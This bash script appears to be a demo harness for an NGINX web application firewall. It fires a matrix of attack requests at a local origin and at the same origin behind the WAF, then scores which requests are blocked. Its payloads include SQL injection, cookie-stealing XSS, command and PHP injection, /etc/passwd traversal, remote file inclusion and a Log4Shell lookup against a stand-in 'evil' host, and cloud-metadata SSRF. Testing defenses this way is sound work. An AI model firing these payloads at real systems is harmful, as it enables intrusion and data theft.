#!/usr/bin/env bash
#
# F5 NGINX WAF -- comprehensive capability showcase.
#
# Fires a broad matrix of real attacks at (a) the raw origin and (b) the same
# origin behind the WAF, proving each attack class is exploitable unprotected
# and blocked by the WAF. No license required -- the WAF layer is OWASP CRS on
# ModSecurity-NGINX, a drop-in stand-in for F5 NGINX App Protect WAF.
#
set -uo pipefail

ORIGIN="${ORIGIN:-http://localhost:8081}"
WAF="${WAF:-http://localhost:8082}"

B=$'\e[1m'; D=$'\e[2m'; R=$'\e[31m'; G=$'\e[32m'; Y=$'\e[33m'; C=$'\e[36m'; M=$'\e[35m'; X=$'\e[0m'
pass=0; fail=0

hr(){ printf '%s%s%s\n' "$D" "----------------------------------------------------------------------------" "$X"; }
cat_hdr(){ printf '\n%s%s### %s%s\n' "$B" "$M" "$1" "$X"; }

# GET-based attack: exploit on origin, blocked on WAF.
#   atk <label> <path> <origin-success-regex>
atk(){
  local label="$1" path="$2" sig="$3" ob oc wcode
  ob=$(curl -s -m 10 "${ORIGIN}${path}" 2>/dev/null)
  if echo "$ob" | grep -qiE "$sig"; then oc="${Y}exploited${X}"; else oc="${D}no-leak${X} "; fi
  wcode=$(curl -s -o /dev/null -w '%{http_code}' -m 10 "${WAF}${path}" 2>/dev/null)
  if [[ "$wcode" == "403" ]]; then
    printf '  %-26s origin %b  WAF %s403 BLOCKED%s\n' "$label" "$oc" "$G" "$X"; pass=$((pass+1))
  else
    printf '  %-26s origin %b  WAF %s%s NOT BLOCKED%s\n' "$label" "$oc" "$R" "$wcode" "$X"; fail=$((fail+1))
  fi
}

# WAF-layer attack delivered via headers/method (no origin contrast).
#   atkw <label> <path> <curl-arg>...
atkw(){
  local label="$1" path="$2"; shift 2
  local wcode
  wcode=$(curl -s -o /dev/null -w '%{http_code}' -m 10 "$@" "${WAF}${path}" 2>/dev/null)
  if [[ "$wcode" == "403" ]]; then
    printf '  %-26s %-16s WAF %s403 BLOCKED%s\n' "$label" "" "$G" "$X"; pass=$((pass+1))
  else
    printf '  %-26s %-16s WAF %s%s NOT BLOCKED%s\n' "$label" "" "$R" "$wcode" "$X"; fail=$((fail+1))
  fi
}

legit(){
  local label="$1" path="$2" wcode
  wcode=$(curl -s -o /dev/null -w '%{http_code}' -m 10 "${WAF}${path}" 2>/dev/null)
  if [[ "$wcode" == "200" ]]; then
    printf '  %-26s %-16s WAF %s200 ALLOWED%s\n' "$label" "" "$G" "$X"; pass=$((pass+1))
  else
    printf '  %-26s %-16s WAF %s%s FALSE POSITIVE%s\n' "$label" "" "$R" "$wcode" "$X"; fail=$((fail+1))
  fi
}

printf '\n%s========================================================================%s\n' "$B" "$X"
printf '%s  F5 NGINX WAF -- comprehensive capability showcase%s\n' "$B" "$X"
printf '    origin (unprotected): %s\n' "$ORIGIN"
printf '    same origin via WAF:  %s\n' "$WAF"
printf '%s========================================================================%s\n' "$B" "$X"

cat_hdr "Injection & OWASP Top 10"
atk "SQL injection"          "/products?cat=deposit%27%20OR%20%271%27=%271" 'LEAKED|SSN'
atk "Reflected XSS"          "/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E" '<script>alert'
atk "Command injection (RCE)" "/ping?host=127.0.0.1;whoami" 'root'
atk "Code injection (PHP)"   "/render?tpl=%3C%3Fphp%20system(%27id%27)%3B%3F%3E" 'php'
atk "Path traversal (LFI)"   "/download?file=../../../../etc/passwd" 'root:.*:0:0'
atk "Remote file inclusion"  "/fetch?url=http%3A%2F%2Fevil.host%2Fshell.txt%3F" 'Fetching'

cat_hdr "High-profile threat campaigns"
atk "Log4Shell (JNDI lookup)" "/lookup?user=%24%7Bjndi%3Aldap%3A%2F%2Fevil%2Fx%7D" 'log4shell|jndi'
atk "SSRF (cloud metadata)"   "/fetch?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F" 'ssrf'

cat_hdr "Bot & scanner defense"
atkw "Scanner UA: sqlmap"     "/" -A 'sqlmap/1.5.2'
atkw "Scanner UA: nikto"      "/" -A 'nikto/2.1.6'

cat_hdr "Protocol & method enforcement"
atkw "Disallowed method: PUT" "/" -X PUT
atkw "Disallowed method: DELETE" "/products" -X DELETE

cat_hdr "Legitimate traffic (must still pass)"
legit "Home page"            "/"
legit "Product lookup"       "/products?cat=deposit"
legit "Product search"       "/search?q=laptop"
legit "Directory lookup"     "/lookup?user=guest"
legit "Link preview"         "/fetch?url=https%3A%2F%2Facme.example%2Flogo.png"

hr
total=$((pass+fail))
printf '\n%s  Capability scorecard: %s/%s enforced correctly%s\n' "$B" "$pass" "$total" "$X"
if [[ "$fail" -eq 0 ]]; then
  printf '  %sPASS%s -- every attack blocked, every legitimate request allowed.\n\n' "$G" "$X"; exit 0
else
  printf '  %sFAIL%s -- %s check(s) did not behave as expected.\n\n' "$R" "$X" "$fail"; exit 1
fi
